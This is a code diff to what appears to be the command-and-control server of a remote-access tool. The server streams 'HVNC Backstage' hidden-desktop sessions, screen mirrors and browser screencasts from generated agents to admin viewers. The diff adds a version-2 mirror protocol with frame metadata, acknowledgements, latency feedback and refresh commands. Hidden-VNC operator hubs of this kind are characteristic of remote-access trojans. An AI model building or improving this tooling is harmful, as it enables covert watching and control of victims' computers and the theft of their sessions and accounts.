@@ -25,6 +25,7 @@ from .generator import AgentGenerator, OUTPUT_DIR
 from .ip_watcher import watch_ip
 from .ota_manager import OTAManager
 from .auth import AuthManager
+from .mirror_delivery import unpack_frame
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
 logger = logging.getLogger("master_hub.server")
@@ -533,6 +534,7 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
             msg = await websocket.receive()
             if "bytes" in msg and msg["bytes"]:
                 frame_data = msg["bytes"]
+                mirror_metadata = None
                 target_viewers = []
                 if len(frame_data) > 1 and frame_data[0] == 1:
                     # Explicit Backstage frame
@@ -542,6 +544,8 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
                     # Explicit Screen Mirror frame
                     target_viewers = list(agent.mirror_viewers.values())
                     raw_frame = frame_data[1:]
+                    if raw_frame.startswith(b"MRA2"):
+                        mirror_metadata, raw_frame = unpack_frame(raw_frame, b"MRA2")
                 elif len(frame_data) > 1 and frame_data[0] == 3:
                     # Explicit CDP Screencast browser frame
                     target_viewers = list(agent.viewers.values()) + list(agent.mirror_viewers.values())
@@ -557,13 +561,23 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
 
                 # Push frame to viewer sessions safely without ASGI write collisions
                 for v_sess in target_viewers:
-                    v_sess.push_frame(raw_frame)
+                    if getattr(v_sess, "protocol_version", 0) == 2 and mirror_metadata is not None:
+                        v_sess.push_frame(raw_frame, mirror_metadata)
+                    else:
+                        v_sess.push_frame(raw_frame)
+                if mirror_metadata is not None:
+                    await agent.send_text_safe(json.dumps({"type": "mirror_frame_ack",
+                        "stream_id": mirror_metadata.get("stream_id"), "sequence": mirror_metadata.get("sequence")}))
 
             elif "text" in msg and msg["text"]:
                 text_data = json.loads(msg["text"])
                 if text_data.get("type") == "heartbeat":
                     agent.update_info(text_data.get("data", {}))
                     await broadcast_agent_list()
+                elif text_data.get("type") == "mirror_health":
+                    for v_sess in list(agent.mirror_viewers.values()):
+                        if getattr(v_sess, "protocol_version", 0) == 2:
+                            v_sess.push_text(msg["text"])
                 else:
                     raw_text = msg["text"]
                     for v_sess in list(agent.viewers.values()) + list(agent.mirror_viewers.values()):
@@ -598,7 +612,8 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
         await websocket.close()
         return
 
-    mirror_ack = mode == "mirror" and websocket.query_params.get("mirror_ack") == "1"
+    mirror_ack = (int(websocket.query_params.get("mirror_ack")) if mode == "mirror"
+                  and websocket.query_params.get("mirror_ack") in ("1", "2") else 0)
     v_session = agent_mgr.attach_viewer(agent_id, viewer_id, websocket, mode=mode, mirror_ack=mirror_ack)
     if not v_session:
         await websocket.close()
@@ -630,7 +645,8 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
     # Tell the agent to start appropriate stream (Mirror vs HVNC Backstage)
     try:
         if mode == "mirror":
-            await agent.send_text_safe(json.dumps({"type": "start_mirror"}))
+            await agent.send_text_safe(json.dumps({"type": "start_mirror", "transport": 2,
+                "preview": all(getattr(v, "protocol_version", 0) == 2 for v in agent.mirror_viewers.values())}))
             agent.is_streaming_mirror = True
         else:
             await agent.send_text_safe(json.dumps({"type": "start_hvnc"}))
@@ -646,7 +662,16 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
             try:
                 msg_obj = json.loads(data)
                 if mirror_ack and isinstance(msg_obj, dict) and msg_obj.get("type") == "mirror_frame_ack":
-                    v_session.acknowledge(msg_obj.get("sequence"))
+                    if mirror_ack == 2:
+                        delivery_ms = v_session.acknowledge(msg_obj.get("sequence"), msg_obj.get("decoded", True) is not False)
+                        if delivery_ms is not None and len(agent.mirror_viewers) == 1:
+                            await agent.send_text_safe(json.dumps({"type": "mirror_feedback", "delivery_ms": delivery_ms}))
+                    else:
+                        v_session.acknowledge(msg_obj.get("sequence"))
+                    continue
+                if mirror_ack == 2 and isinstance(msg_obj, dict) and msg_obj.get("type") == "mirror_refresh":
+                    v_session.refresh()
+                    await agent.send_text_safe(json.dumps({"type": "mirror_refresh"}))
                     continue
                 if isinstance(msg_obj, dict) and "mode" not in msg_obj:
                     msg_obj["mode"] = mode
@@ -670,6 +695,9 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
                 agent.is_streaming_mirror = False
                 await agent.send_text_safe(json.dumps({"type": "stop_mirror"}))
                 await broadcast_agent_list()
+            else:
+                await agent.send_text_safe(json.dumps({"type": "start_mirror", "transport": 2,
+                    "preview": all(getattr(v, "protocol_version", 0) == 2 for v in agent.mirror_viewers.values())}))
         else:
             if not agent.viewers:
                 agent.is_streaming_hvnc = False
